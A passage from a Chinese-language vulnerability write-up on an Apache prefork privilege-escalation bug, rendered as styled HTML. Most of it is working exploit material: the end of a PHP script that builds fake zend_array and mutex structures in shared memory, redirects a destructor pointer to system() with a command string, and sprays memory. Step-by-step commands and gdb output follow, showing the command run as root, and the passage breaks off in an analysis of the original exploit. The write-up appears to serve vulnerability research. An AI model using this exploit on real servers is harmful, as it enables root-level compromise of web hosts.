class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">我们需要将</span><span class="cs9FB05234">prefork_child_bucket</span><span class="cs7FFD2630">与</span><span class="cs9FB05234">zend_object</span><span class="cs7FFD2630">结合，使其包含</span><span class="cs9FB05234">zend_object </span><span class="cs7FFD2630">的</span><span class="cs9FB05234"> properties</span><span class="cs7FFD2630">字段</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">因此</span><span class="cs9FB05234">prefork_child_bucket</span><span class="cs7FFD2630">的</span><span class="cs9FB05234">&quot;</span><span class="cs7FFD2630">大小</span><span class="cs9FB05234">&quot;</span><span class="cs7FFD2630">是</span><span class="cs9FB05234">40+16</span><span class="cs7FFD2630">字节</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$evil_parent_end_addr = $evil_parent_start_addr + 40+16;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;evil prefork_child_bucket end addr:0x&quot;.dechex($evil_parent_end_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">将</span><span class="cs9FB05234">apr_proc_mutex_t</span><span class="cs7FFD2630">结构与</span><span class="cs9FB05234">zend_array</span><span class="cs7FFD2630">结构结合为一个结构</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$evil_zend_array_start_addr = $evil_parent_end_addr;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;evil zend_array start addr:0x&quot;.dechex($evil_zend_array_start_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$evil_zend_array_end_addr = $evil_zend_array_start_addr + 0x38;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;evil zend_array end addr:0x&quot;.dechex($evil_zend_array_end_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//apr_proc_mutex_unix_lock_methods_t</span><span class="cs7FFD2630">结构</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$evil_mutex_methods_start_addr = $evil_zend_array_end_addr;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$evil_mutex_methods_end_addr = $evil_mutex_methods_start_addr + 0x50;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">echo &quot;evil mutex_methods start addr:0x&quot;.dechex($evil_mutex_methods_start_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;evil mutex_methods end addr:0x&quot;.dechex($evil_mutex_methods_end_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//system()</span><span class="cs7FFD2630">中的字符串</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$evil_string = &quot;touch /hello&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$evil_string_len = strlen($evil_string)+1;//\0</span><span class="cs7FFD2630">结尾</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if($evil_string_len%8){//</span><span class="cs7FFD2630">对齐</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$evil_string_len = ((int)($evil_string_len/8)+1)*8;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;evil string: &quot;.$evil_string.&quot; len:&quot;.$evil_string_len.&quot;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$evil_string_start_addr = $evil_mutex_methods_end_addr;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$evil_string_end_addr = $evil_string_start_addr + $evil_string_len;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">echo &quot;evil string start addr:0x&quot;.dechex($evil_string_start_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;evil string end addr:0x&quot;.dechex($evil_string_end_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">查找</span><span class="cs9FB05234">zend_object_std_dtor</span><span class="cs7FFD2630">的地址</span><span class="cs9FB05234">(</span><span class="cs7FFD2630">我的在</span><span class="cs9FB05234">libphp7.so)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$zend_object_std_dtor_addr = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$libphp_region = get_mem_region(&quot;libphp&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if(!count($libphp_region)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;die(&quot;can&#39;t find zend_object_std_dtor function addr\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">for($i = 0;$i&lt;count($libphp_region);$i++){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if($libphp_region[$i][2] === &quot;r-xp&quot;){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$zend_object_std_dtor_addr = $libphp_region[$i][0]+0x4F8300;//zend_object_std_dtor </span><span class="cs7FFD2630">在</span><span class="cs9FB05234">libphp7.so</span><span class="cs7FFD2630">代码段中的偏移</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if($zend_object_std_dtor_addr === 0){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;die(&quot;can&#39;t find zend_object_std_dtor function addr\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;zend_object_std_dtor function addr:0x&quot;.dechex($zend_object_std_dtor_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">查找</span><span class="cs9FB05234">system</span><span class="cs7FFD2630">函数的地址</span><span class="cs9FB05234">(</span><span class="cs7FFD2630">在</span><span class="cs9FB05234">libpthread</span><span class="cs7FFD2630">中</span><span class="cs9FB05234">)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$system_addr = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$pthread_region = get_mem_region(&quot;pthread&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if(!count($pthread_region)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;die(&quot;can&#39;t find system function addr\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">for($i = 0;$i&lt;count($pthread_region);$i++){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if($pthread_region[$i][2] === &quot;r-xp&quot;){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$system_addr = $pthread_region[$i][0]+0xF4C0;//system </span><span class="cs7FFD2630">在</span><span class="cs9FB05234">libpthread-2.17.so</span><span class="cs7FFD2630">代码段中的偏移</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if($system_addr === 0){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;die(&quot;can&#39;t find system function addr\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;system function addr:0x&quot;.dechex($system_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">将</span><span class="cs9FB05234">apr_proc_mutex_unix_lock_methods_t</span><span class="cs7FFD2630">中的</span><span class="cs9FB05234">child_init</span><span class="cs7FFD2630">改为</span><span class="cs9FB05234">zend_object_std_dtor</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$child_init = $evil_mutex_methods_start_addr+0x30;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;child_init(0x&quot;.dechex($child_init).&quot;) =&gt; zend_object_std_dtor\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">write_mem_qword($evil_mutex_methods_start_addr+0x30,$zend_object_std_dtor_addr);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">将混合结构</span><span class="cs9FB05234">zend_array</span><span class="cs7FFD2630">的</span><span class="cs9FB05234">pDestructor</span><span class="cs7FFD2630">指向</span><span class="cs9FB05234">system</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$pDestructor = $evil_zend_array_start_addr + 0x30;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;pDestructor(0x&quot;.dechex($pDestructor).&quot;) =&gt; system\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">write_mem_qword($pDestructor,$system_addr);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">将混合结构</span><span class="cs9FB05234">zend_array</span><span class="cs7FFD2630">的</span><span class="cs9FB05234">meth</span><span class="cs7FFD2630">指向</span><span class="cs9FB05234">apr_proc_mutex_unix_lock_methods_t</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$meth = $evil_zend_array_start_addr + 0x8;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;meth(0x&quot;.dechex($meth).&quot;) =&gt; mutex_mthods_struct\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">write_mem_qword($meth,$evil_mutex_methods_start_addr);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">write_mem_qword($evil_zend_array_start_addr,0x1);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">将</span><span class="cs9FB05234">prefork_child_bucket</span><span class="cs7FFD2630">中的</span><span class="cs9FB05234">mutex</span><span class="cs7FFD2630">指向混合结构</span><span class="cs9FB05234">zend_array</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$mutex = $evil_parent_start_addr + 0x10;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;mutex(0x&quot;.dechex($mutex).&quot;) =&gt; zend_array struct\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">write_mem_qword($mutex,$evil_zend_array_start_addr);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">将混合结构</span><span class="cs9FB05234">prefork_child_bucket</span><span class="cs7FFD2630">中的</span><span class="cs9FB05234">properties</span><span class="cs7FFD2630">指向</span><span class="cs9FB05234">zend_array</span><span class="cs7FFD2630">结构</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$properties = $evil_parent_start_addr + 0x20+0x10;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;properties(0x&quot;.dechex($properties).&quot;) =&gt; zend_array struct\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">write_mem_qword($properties,$evil_zend_array_start_addr);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//system </span><span class="cs7FFD2630">字符串</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">写入</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">for($i = 0;$i&lt;strlen($evil_string);$i++){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$b = ord($evil_string[$i]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;write_mem($evil_string_start_addr+$i,$b);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">write_mem($evil_string_start_addr+$i,0);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">将</span><span class="cs9FB05234">zend_array</span><span class="cs7FFD2630">中的</span><span class="cs9FB05234">arData</span><span class="cs7FFD2630">指向</span><span class="cs9FB05234">system</span><span class="cs7FFD2630">字符串</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$ar_data = $evil_zend_array_start_addr + 0x10;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;ar_data(0x&quot;.dechex($ar_data).&quot;) =&gt; evil string\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">write_mem_qword($ar_data,$evil_string_start_addr);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">将</span><span class="cs9FB05234">zend_array</span><span class="cs7FFD2630">中的</span><span class="cs9FB05234">nNumUsed</span><span class="cs7FFD2630">设置为</span><span class="cs9FB05234">1</span><span class="cs7FFD2630">，（自行分析代码去）</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$nNumUsed = $evil_zend_array_start_addr + 0x18;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">write_mem_qword($nNumUsed,1);</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">堆喷</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;\nSpraying the shared memory start\n\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$shm_region = get_mem_region(&quot;/dev/zero&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$evil_shm_start_addr = $evil_string_end_addr;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$evil_shm_end_addr = $shm_region[0][1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$evil_shm_size = $evil_shm_end_addr - $evil_shm_start_addr;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$evil_shm_mid_addr = $evil_shm_start_addr + 8*((int)(((int)($evil_shm_size/2))/8) + 1);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">echo &quot;evil_shm_start:0x&quot;.dechex($evil_shm_start_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;evil_shm_end:0x&quot;.dechex($evil_shm_end_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;evil_shm_size:&quot;.dechex($evil_shm_size).&quot;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">for($i = 0;$i&lt;$evil_shm_size;$i+=8){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;write_mem_qword($evil_shm_start_addr+$i,$evil_zend_array_start_addr);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">echo &quot;evil_shm_mid_addr:0x&quot;.dechex($evil_shm_mid_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">echo &quot;bucket:&quot;.dechex($bucket).&quot;\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">利用成功时，会在根目录下，创建</span><span class="cs8926E06">hello</span><span class="cs9C1B1871">文件</span></p><h4 class="cs868C439D">
			<a name="步骤"><span class="cs6EDCDAE2">步骤</span></a></h4>
		<h5 class="cs868C439D">
			<a name="根目录显示"><span class="cs1C2E50E7">根目录显示</span></a></h5>
		<p class="cs3A447A38"><span class="cs98083A41">➜</span><span class="cs9FB05234"> &nbsp;~ ls /</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">bin &nbsp;boot &nbsp;dev &nbsp;etc &nbsp;home &nbsp;lib &nbsp;lib64 &nbsp;media &nbsp;mnt &nbsp;opt &nbsp;proc &nbsp;root &nbsp;run &nbsp;sbin &nbsp;srv &nbsp;sys &nbsp;tmp &nbsp;usr &nbsp;var &nbsp;www</span></p><h5 class="cs868C439D">
			<a name="让服务器执行恶意php代码"><span class="cs1C2E50E7">让服务器执行恶意</span><span class="cs4B51D5E4">php</span><span class="cs1C2E50E7">代码</span></a></h5>
		<p class="cs3A447A38"><span class="cs98083A41">➜</span><span class="cs9FB05234"> &nbsp;~ curl 127.0.0.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">PID: 19896</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/dev/zero start addr:0x7f1f62a32000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/dev/zero end addr:0x7f1f62a4a000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">self parent struct addr:0x7f1f62a32040</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">parent arr addr:0x7f1f62a32040</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">heap start addr:0xf59000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">heap end addr:0x1022000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">libapr text start addr:0x7f1f61ffa000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">libapr text end addr:0x7f1f6202f000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">libapr data start addr:0x7f1f6222e000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">libapr data end addr:0x7f1f6222f000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">all_buckets addr:0xff0c18</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">evil prefork_child_bucket start addr:0x7f1f62a321a8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">evil prefork_child_bucket end addr:0x7f1f62a321e0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">evil zend_array start addr:0x7f1f62a321e0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">evil zend_array end addr:0x7f1f62a32218</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">evil mutex_methods start addr:0x7f1f62a32218</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">evil mutex_methods end addr:0x7f1f62a32268</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">evil string: touch /hello len:16</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">evil string start addr:0x7f1f62a32268</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">evil string end addr:0x7f1f62a32278</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">zend_object_std_dtor function addr:0x7f1f5c03d300</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">system function addr:0x7f1f617a94c0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">child_init(0x7f1f62a32248) =&gt; zend_object_std_dtor</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">pDestructor(0x7f1f62a32210) =&gt; system</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">meth(0x7f1f62a321e8) =&gt; mutex_mthods_struct</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">mutex(0x7f1f62a321b8) =&gt; zend_array struct</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">properties(0x7f1f62a321d8) =&gt; zend_array struct</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ar_data(0x7f1f62a321f0) =&gt; evil string</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">Spraying the shared memory start</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">evil_shm_start:0x7f1f62a32278</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">evil_shm_end:0x7f1f62a4a000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">evil_shm_size:17d88</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">evil_shm_mid_addr:0x7f1f62a3e140</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">bucket:fe3ec349aa5</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">此时，共享内存中，已经被我们的恶意数据给填充。</span></p><h5 class="cs868C439D">
			<a name="为通过gdb模拟修改bucket指向我们的恶意结构做准备"><span class="cs1C2E50E7">为通过</span><span class="cs4B51D5E4">gdb</span><span class="cs1C2E50E7">模拟修改</span><span class="cs4B51D5E4">bucket</span><span class="cs1C2E50E7">指向我们的恶意结构做准备</span></a></h5>
		<p class="cs3A447A38"><span class="cs9FB05234">[root@bogon john]# ps -aux | grep httpd</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">root &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;19895 &nbsp;0.0 &nbsp;0.2 285296 10652 ? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ss &nbsp;&nbsp;14:27 &nbsp;&nbsp;0:00 /usr/local/httpd//bin/httpd -k start</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">www &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;19896 &nbsp;0.0 &nbsp;0.2 287512 &nbsp;9348 ? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S &nbsp;&nbsp;&nbsp;14:27 &nbsp;&nbsp;0:00 /usr/local/httpd//bin/httpd -k start</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">www &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;19897 &nbsp;0.0 &nbsp;0.1 287512 &nbsp;7616 ? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S &nbsp;&nbsp;&nbsp;14:27 &nbsp;&nbsp;0:00 /usr/local/httpd//bin/httpd -k start</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">www &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;19898 &nbsp;0.0 &nbsp;0.1 287512 &nbsp;7616 ? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S &nbsp;&nbsp;&nbsp;14:27 &nbsp;&nbsp;0:00 /usr/local/httpd//bin/httpd -k start</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">www &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;19899 &nbsp;0.0 &nbsp;0.1 287512 &nbsp;7616 ? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S &nbsp;&nbsp;&nbsp;14:27 &nbsp;&nbsp;0:00 /usr/local/httpd//bin/httpd -k start</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">www &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;19900 &nbsp;0.0 &nbsp;0.1 287512 &nbsp;7616 ? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S &nbsp;&nbsp;&nbsp;14:27 &nbsp;&nbsp;0:00 /usr/local/httpd//bin/httpd -k start</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">root &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;20112 &nbsp;0.0 &nbsp;0.0 112708 &nbsp;&nbsp;980 pts/2 &nbsp;&nbsp;&nbsp;R+ &nbsp;&nbsp;14:30 &nbsp;&nbsp;0:00 grep --color=auto httpd</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[root@bogon john]# gdb attach 19895</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">(gdb) break child_main</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Breakpoint 1 at 0x46c000: file prefork.c, line 380.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">(gdb) set follow-fork-mode child</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">(gdb) c</span></p><h5 class="cs868C439D">
			<a name="执行apachectl-graceful使其优雅重启"><span class="cs1C2E50E7">执行</span><span class="cs4B51D5E4">apachectl graceful</span><span class="cs1C2E50E7">，使其优雅重启</span></a></h5>
		<p class="cs3A447A38"><span class="cs9FB05234">[root@bogon john]# apachectl graceful</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[root@bogon john]# </span></p><h5 class="cs868C439D">
			<a name="修改my_bucket"><span class="cs1C2E50E7">修改</span><span class="cs4B51D5E4">my_bucket</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">我们将</span><span class="cs8926E06">my_bucket</span><span class="cs9C1B1871">，设置为</span><span class="cs8926E06">0x7f1f62a3e140</span><span class="cs9C1B1871">，该地址是执行恶意</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">代码时，输出的</span><span class="cs8926E06">evil_shm_mid_addr</span></p><p class="cs3A447A38"><span class="cs9FB05234">Continuing.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">Program received signal SIGUSR1, User defined signal 1.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x00007f1f612bdf53 in __select_nocancel () from /lib64/libc.so.6</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">(gdb) c</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Continuing.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[New process 20155]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[Thread debugging using libthread_db enabled]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Using host libthread_db library &quot;/lib64/libthread_db.so.1&quot;.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[Switching to Thread 0x7f1f62ae9780 (LWP 20155)]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">Breakpoint 1, child_main (child_num_arg=child_num_arg@entry=0, child_bucket=child_bucket@entry=0) at prefork.c:380</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">380 &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">(gdb) set my_bucket = 0x7f1f62a3e140</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">(gdb) c</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Continuing.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[New process 20177]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[Thread debugging using libthread_db enabled]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Using host libthread_db library &quot;/lib64/libthread_db.so.1&quot;.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">process 20177 is executing new program: /usr/bin/bash</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Error in re-setting breakpoint 1: Function &quot;child_main&quot; not defined.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">process 20177 is executing new program: /usr/bin/touch</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Missing separate debuginfos, use: debuginfo-install bash-4.2.46-31.el7.x86_64</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[Inferior 3 (process 20177) exited normally]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Missing separate debuginfos, use: debuginfo-install coreutils-8.22-23.el7.x86_64</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">(gdb) </span></p><h5 class="cs868C439D">
			<a name="查看根目录发现利用成功"><span class="cs1C2E50E7">查看根目录，发现利用成功</span></a></h5>
		<p class="cs3A447A38"><span class="cs98083A41">➜</span><span class="cs9FB05234"> &nbsp;~ ls /</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">bin &nbsp;boot &nbsp;dev &nbsp;etc &nbsp;hello &nbsp;home &nbsp;lib &nbsp;lib64 &nbsp;media &nbsp;mnt &nbsp;opt &nbsp;proc &nbsp;root &nbsp;run &nbsp;sbin &nbsp;srv &nbsp;sys &nbsp;tmp &nbsp;usr &nbsp;var &nbsp;www</span></p><h4 class="cs868C439D">
			<a name="exp分析"><span class="csBF12A472">EXP</span><span class="cs6EDCDAE2">分析</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs8926E06">1.</span><span class="cs9C1B1871">在作者提供的</span><span class="cs8926E06">Exp</span><span class="cs9C1B1871">中，没有依赖具体的硬编码数值。在</span><span class="cs8926E06">get_all_address</span><span class="cs9C1B1871">函数中利用</span><span class="cs8926E06"> /proc/self/maps</span><span class="cs9C1B1871">和文件读取的方式定位到了如下</span><span class="cs8926E06">shm, system, libaprR, libaprX, apache, zend_object_std_dtor</span><span class="cs9C1B1871">几个函数的地址以及共享内存起始地址。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2.</span><span class="cs9C1B1871">在</span><span class="cs8926E06">get_workers_pids</span><span class="cs9C1B1871">中通过枚举</span><span class="cs8926E06">/proc/</span><span class="cs2F00A314">/cmdline and /proc/</span><span class="cs8926E06">/status</span><span class="cs9C1B1871">文件，得到所有</span><span class="cs8926E06">worker</span><span class="cs9C1B1871">进程的</span><span class="cs8926E06">PID</span><span class="cs9C1B1871">，用于后续在共享内存中定位</span><span class="cs8926E06">process_score</span><span class="cs9C1B1871">地址。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">3.</span><span class="cs9C1B1871">最终在</span><span class="cs8926E06">real</span><span class="cs9C1B1871">函数中，作者通过在共享内存中查找</span><span class="cs8926E06">worker process</span><span class="cs9C1B1871">的</span><span class="cs8926E06">PID</span><span class="cs9C1B1871">从而定位到每个</span><span class="cs8926E06">process_score</span><span class="cs9C1B1871">结构，并利用被</span><span class="cs8926E06">UAF</span><span class="cs9C1B1871">漏洞修改过的字符串对内存进行修改。利用内存模式匹配找到</span><span 